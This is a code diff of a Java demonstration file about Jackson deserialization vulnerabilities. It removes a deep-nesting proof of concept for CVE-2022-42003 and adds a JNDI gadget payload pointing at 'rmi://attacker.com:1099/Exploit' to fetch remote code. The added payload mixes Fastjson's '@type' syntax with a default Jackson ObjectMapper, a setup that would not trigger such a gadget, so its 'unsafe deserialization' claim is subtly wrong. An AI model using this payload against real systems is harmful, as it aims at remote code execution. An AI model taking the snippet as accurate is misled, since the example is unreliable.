@@ -1,22 +1,17 @@
-import com.fasterxml.jackson.databind.DeserializationFeature;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
-public class CVE_2022_42003 {
+public class VulnerableJackson {
     public static void main(String[] args) {
-        // Create a JSON payload with deeply nested arrays
-        String maliciousJson = "[[[[[[[[[[[[[[[[[[[[[[\"value\"]]]]]]]]]]]]]]]]]]]]]";
-
-        // Configure ObjectMapper with the vulnerable feature enabled
-        ObjectMapper objectMapper = new ObjectMapper();
-        objectMapper.configure(DeserializationFeature.UNWRAP_SINGLE_VALUE_ARRAYS, true);
-
         try {
-            // Attempt to deserialize the malicious JSON
-            String result = objectMapper.readValue(maliciousJson, String.class);
-            System.out.println("Deserialized result: " + result);
+            // Malicious JSON payload
+            String json = "{ \"@type\": \"org.apache.commons.configuration.JNDIConfiguration\", \"resourceName\": \"rmi://attacker.com:1099/Exploit\" }";
+
+            // ObjectMapper without proper security configurations
+            ObjectMapper mapper = new ObjectMapper();
+            Object obj = mapper.readValue(json, Object.class); // Unsafe deserialization
+            System.out.println("Deserialized object: " + obj);
         } catch (Exception e) {
-            // Catch and print any exceptions
-            System.err.println("Exception occurred: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 }
